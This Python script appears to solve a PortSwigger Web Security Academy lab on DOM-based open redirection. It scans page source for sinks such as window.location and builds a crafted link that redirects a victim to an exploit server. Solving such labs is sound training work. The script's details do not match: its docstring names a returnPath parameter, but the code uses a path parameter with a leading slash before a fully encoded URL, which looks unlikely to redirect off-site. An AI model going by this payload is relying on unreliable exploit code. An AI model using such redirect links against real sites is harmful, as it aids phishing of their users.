"""
Lab 4: DOM-based open redirection
https://portswigger.net/web-security/dom-based/open-redirection/lab-dom-based-open-redirection
Difficulty: Practitioner

📝 The flaw: client-side JS reads a redirect target from a URL parameter
(commonly `?returnPath=` on the lab's product/next-page flow) and assigns it
straight to window.location with no allowlist check.

Goal: deliver a link that redirects the victim to the exploit server,
proving an arbitrary off-site redirect.
"""

from urllib.parse import quote

from utils import get_session, log, note, fetch_page_source, grep_for_patterns

TARGET = "https://YOUR-LAB-ID.web-security-academy.net"
EXPLOIT_SERVER = "https://exploit-YOUR-LAB-ID.exploit-server.net"


def run():
    s = get_session()
    source = fetch_page_source(s, f"{TARGET}/")
    note("Looking for a sink like `location = someParam` fed from location.search.")
    grep_for_patterns(source, ["returnPath", "location.search", "window.location"])

    malicious_link = f"{TARGET}/post/next?path=/{quote(EXPLOIT_SERVER, safe='')}"
    log(f"Malicious link: {malicious_link}")

    note("This one doesn't need an exploit-server HTML page — the malicious")
    note("link IS the delivery mechanism. Submit it directly via the lab's")
    note("'Deliver to victim' / access-log-based solve flow where applicable,")
    note("or just confirm manually that visiting it lands you off-site.")


if __name__ == "__main__":
    run()
